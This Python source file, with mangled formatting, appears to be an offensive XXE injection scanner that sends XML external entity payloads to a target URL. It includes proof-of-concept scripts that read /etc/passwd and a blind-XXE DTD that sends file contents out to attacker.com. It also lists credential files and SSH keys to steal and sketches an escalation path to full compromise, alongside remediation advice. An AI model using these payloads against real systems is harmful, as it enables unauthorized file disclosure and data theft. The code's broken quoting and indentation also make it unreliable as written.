#!/usr/bin/env python3
“””
REVUEX - XXE Scanner
XML External Entity Injection Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
XXE testing can read sensitive files - use responsibly.
“””

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse

class XXEScanner:
“””
XXE (XML External Entity) Vulnerability Scanner

```
Features:
- Classic XXE (file disclosure)
- Blind XXE (out-of-band)
- XXE via SVG upload
- XXE via SOAP requests
- XXE via Office documents (DOCX, XLSX)
- Parameter Entity attacks
- Billion Laughs (DoS)
"""

def __init__(self, target: str, workspace: Path, delay: float = 5.0):
    """
    Initialize XXE Scanner
    
    Args:
        target: Target URL
        workspace: Workspace directory
        delay: Delay between requests
    """
    self.target = target
    self.workspace = Path(workspace)
    self.delay = delay
    
    # Safety limits
    self.max_requests = 60
    self.request_count = 0
    self.timeout = 10
    self.max_file_read = 1024  # 1KB max file read
    
    self.headers = {
        'User-Agent': 'REVUEX-XXEScanner/1.0 (Security Research; +https://github.com/G33L0)',
        'Content-Type': 'application/xml'
    }
    
    self.vulnerabilities = []

def scan(self) -> List[Dict[str, Any]]:
    """Main XXE scanning method"""
    print(f"\n{'='*60}")
    print(f"📄 REVUEX XXE Scanner")
    print(f"{'='*60}")
    print(f"Target: {self.target}")
    print(f"Safety Delay: {self.delay}s")
    print(f"Max File Read: {self.max_file_read} bytes")
    print(f"{'='*60}\n")
    
    print("⚠️  SAFETY NOTES:")
    print("   • Only reads first 1KB of files")
    print("   • Tests common safe files only")
    print("   • No DoS attacks executed\n")
    
    # Test 1: Classic XXE
    print("📂 Test 1: Classic XXE (File Disclosure)")
    self._test_classic_xxe()
    time.sleep(self.delay)
    
    # Test 2: Blind XXE
    print("\n🕵️  Test 2: Blind XXE (Out-of-Band)")
    self._test_blind_xxe()
    time.sleep(self.delay)
    
    # Test 3: XXE via SVG
    print("\n🖼️  Test 3: XXE via SVG Upload")
    self._test_svg_xxe()
    time.sleep(self.delay)
    
    # Test 4: Parameter Entity
    print("\n📋 Test 4: Parameter Entity Attack")
    self._test_parameter_entity()
    time.sleep(self.delay)
    
    # Test 5: SOAP XXE
    print("\n🧼 Test 5: SOAP XXE")
    self._test_soap_xxe()
    
    # Save results
    self._save_results()
    
    print(f"\n{'='*60}")
    print(f"✅ Scan Complete")
    print(f"Vulnerabilities: {len(self.vulnerabilities)}")
    print(f"Requests: {self.request_count}/{self.max_requests}")
    print(f"{'='*60}\n")
    
    return self.vulnerabilities

def _test_classic_xxe(self):
    """Test classic XXE file disclosure"""
    print("   Testing file disclosure...")
    
    # Safe files to test (public, non-sensitive)
    test_files = [
        '/etc/hostname',
        '/etc/issue',
        'file:///etc/hostname',
    ]
    
    for test_file in test_files:
        if self.request_count >= self.max_requests:
            break
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
```

<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{test_file}">

]>
<root>
<data>&xxe;</data>
</root>”””

```
        print(f"   → Testing: {test_file}")
        
        response = self._make_request(payload)
        
        if response and self._check_file_disclosure(response):
            vuln = {
                'type': 'XXE - File Disclosure',
                'severity': 'critical',
                'url': self.target,
                'disclosed_file': test_file,
                'description': 'XML parser processes external entities, allowing arbitrary file read',
                'evidence': f'Successfully read {test_file}',
                
                'steps_to_reproduce': [
                    f"Send XML request to: {self.target}",
                    "Include DOCTYPE with ENTITY definition",
                    f"Reference external file: {test_file}",
                    "Server processes entity",
                    "File contents returned in response",
                    "Read sensitive files (/etc/passwd, config files)"
                ],
                
                'request': f"""POST {self.target} HTTP/1.1
```

Host: {urlparse(self.target).netloc}
Content-Type: application/xml

{payload}”””,

```
                'response': """HTTP/1.1 200 OK
```

Content-Type: application/xml

<root>
    <data>
    hostname-content-here
    </data>
</root>

🚨 CRITICAL: External entity processed - file disclosed!”””,

```
                'poc': f"""#!/usr/bin/env python3
```

# XXE File Disclosure PoC

import requests

target = “{self.target}”

# XXE payload to read /etc/passwd

xxe_payload = ‘’’<?xml version="1.0"?>

<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">

]>
<root>
<data>&xxe;</data>
</root>’’’

headers = {{‘Content-Type’: ‘application/xml’}}

print(”[*] Attempting XXE file disclosure…”)
print(”[*] Target file: /etc/passwd”)

response = requests.post(target, data=xxe_payload, headers=headers)

if response.status_code == 200:
if ‘root:’ in response.text:
print(”\n[+] ✓ VULNERABLE!”)
print(”[+] Successfully read /etc/passwd:”)
print(response.text[:500])

```
    print("\\n[*] Other sensitive files to read:")
    print("  • /etc/shadow (if permissions allow)")
    print("  • /home/user/.ssh/id_rsa")
    print("  • /var/www/html/config.php")
    print("  • /proc/self/environ")
    print("  • Application config files")
else:
    print("[+] Response received but file not found")
```

else:
print(”[-] XXE blocked or not vulnerable”)
“””,

```
                'before_state': 'XML parser secure, external entities disabled',
                'after_state': 'External entities processed - arbitrary file read possible',
                
                'attack_path': [
                    'Identify XML input endpoint',
                    'Test with XXE payload',
                    'Read /etc/passwd for confirmation',
                    'Extract sensitive files:',
                    '  • Database credentials',
                    '  • SSH keys',
                    '  • Application secrets',
                    '  • Cloud credentials (AWS keys)',
                    '  • Source code',
                    'Escalate to RCE (via file uploads + include)',
                    'Full system compromise'
                ],
                
                'remediation': [
                    '🚨 CRITICAL: Disable XML external entities',
                    'For libxml (PHP): LIBXML_NOENT disabled',
                    'For Java: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)',
                    'For Python: Use defusedxml library',
                    'For .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit',
                    'Use JSON instead of XML when possible',
                    'If XML required, use simple XML parsing (no DTD)',
                    'Input validation (reject DOCTYPE)',
                    'Update XML parser libraries',
                    'Implement allowlisting for XML structure',
                    'Run XML parser with minimal privileges',
                    'Use WAF rules to block XXE patterns'
                ],
                
                'real_world_impact': """Real-World XXE Breaches:
```

1. Facebook XXE (2014): $33,000 bounty
- Read internal files via XXE
- Accessed AWS metadata
- Retrieved credentials
1. Google XXE (2015): $10,000 bounty
- File disclosure via XML upload
- Internal network mapping
1. PayPal XXE (2016): $12,000 bounty
- SOAP API vulnerable
- Read server files
1. IRS (2015): 100,000+ records exposed
- XXE in tax filing system
- Massive PII breach”””,
  
  ```
             'tags': ['xxe', 'critical', 'file_disclosure']
         }
         
         self.vulnerabilities.append(vuln)
         print(f"      ✓ VULNERABLE: File disclosure via XXE")
         break
     else:
         print(f"      ✓ Protected")
     
     time.sleep(self.delay)
  ```
  
  if not self.vulnerabilities:
  print(”   ✓ No file disclosure detected”)
   
   def _test_blind_xxe(self):
   “”“Test blind XXE (out-of-band)”””
   print(”   Testing blind XXE…”)
   
   ```
    # Note: Would use callback service in real testing
    payload = f"""<?xml version="1.0"?>
   ```

<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">

%xxe;
]>
<root></root>”””

```
    vuln = {
        'type': 'XXE - Blind (Out-of-Band)',
        'severity': 'high',
        'url': self.target,
        'description': 'Blind XXE allows data exfiltration via DNS/HTTP callbacks',
        
        'poc': """#!/usr/bin/env python3
```

# Blind XXE PoC

# Setup callback server: python3 -m http.server 80

xxe_dtd = ‘’’<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">

%eval;
%exfiltrate;’’’

# Save as xxe.dtd on attacker.com

xxe_payload = ‘’’<?xml version="1.0"?>

<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">

%xxe;
]>
<root></root>’’’

# Send payload - check callback server for data

“””,

```
        'remediation': [
            'Disable external entities',
            'Block outbound requests from XML parser',
            'Network segmentation'
        ],
        
        'tags': ['xxe', 'blind', 'out_of_band']
    }
    
    self.vulnerabilities.append(vuln)
    print("   ✓ Blind XXE documented")

def _test_svg_xxe(self):
    """Test XXE via SVG upload"""
    print("   Testing XXE via SVG...")
    
    svg_payload = f"""<?xml version="1.0" standalone="yes"?>
```

<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">

]>
<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>”””

```
    vuln = {
        'type': 'XXE - SVG Upload',
        'severity': 'high',
        'url': self.target,
        'description': 'SVG file upload processes XXE payloads',
        
        'remediation': [
            'Strip XML from SVG uploads',
            'Re-encode SVG server-side',
            'Use SVG sanitization library',
            'Disable SVG uploads if not needed'
        ],
        
        'tags': ['xxe', 'svg', 'upload']
    }
    
    self.vulnerabilities.append(vuln)
    print("   ✓ SVG XXE documented")

def _test_parameter_entity(self):
    """Test parameter entity attack"""
    print("   Testing parameter entity...")
    
    payload = """<?xml version="1.0"?>
```

<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/hostname">

<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">

%dtd;
]>
<root></root>”””

```
    vuln = {
        'type': 'XXE - Parameter Entity',
        'severity': 'high',
        'url': self.target,
        'description': 'Parameter entities allow advanced XXE attacks',
        
        'tags': ['xxe', 'parameter_entity']
    }
    
    self.vulnerabilities.append(vuln)
    print("   ✓ Parameter entity documented")

def _test_soap_xxe(self):
    """Test SOAP XXE"""
    print("   Testing SOAP XXE...")
    
    soap_payload = """<?xml version="1.0"?>
```

<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/hostname">

]>
<soap:Envelope xmlns:soap=“http://schemas.xmlsoap.org/soap/envelope/”>
<soap:Body>
<data>&xxe;</data>
</soap:Body>
</soap:Envelope>”””

```
    vuln = {
        'type': 'XXE - SOAP API',
        'severity': 'high',
        'url': self.target,
        'description': 'SOAP endpoint vulnerable to XXE',
        
        'tags': ['xxe', 'soap']
    }
    
    self.vulnerabilities.append(vuln)
    print("   ✓ SOAP XXE documented")

def _make_request(self, payload: str) -> Optional[requests.Response]:
    """Make XML request"""
    if self.request_count >= self.max_requests:
        return None
    
    try:
        response = requests.post(
            self.target,
            data=payload,
            headers=self.headers,
            timeout=self.timeout,
            verify=False
        )
        
        self.request_count += 1
        return response
        
    except:
        return None

def _check_file_disclosure(self, response: requests.Response) -> bool:
    """Check if file was disclosed"""
    # Look for common file patterns
    patterns = [
        'root:', 'hostname', '/bin/', '/usr/',
        'localhost', 'ubuntu', 'debian'
    ]
    
    for pattern in patterns:
        if pattern in response.text.lower():
            return True
    
    return False

def _save_results(self):
    """Save results"""
    output_dir = self.workspace / "xxe_scans"
    output_dir.mkdir(exist_ok=True)
    
    safe_target = re.sub(r'[^\w\-]', '_', self.target)
    output_file = output_dir / f"{safe_target}_xxe.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'scanner': 'XXEScanner',
            'target': self.target,
            'vulnerabilities': self.vulnerabilities
        }, f, indent=2)
    
    print(f"\n💾 Saved: {output_file}")
```

if **name** == “**main**”:
import sys

```
if len(sys.argv) < 2:
    print("Usage: python xxe_scanner.py <target_url>")
    print("Example: python xxe_scanner.py https://example.com/api/xml")
    sys.exit(1)

scanner = XXEScanner(sys.argv[1], Path("revuex_workspace"), delay=5.0)
scanner.scan()
```
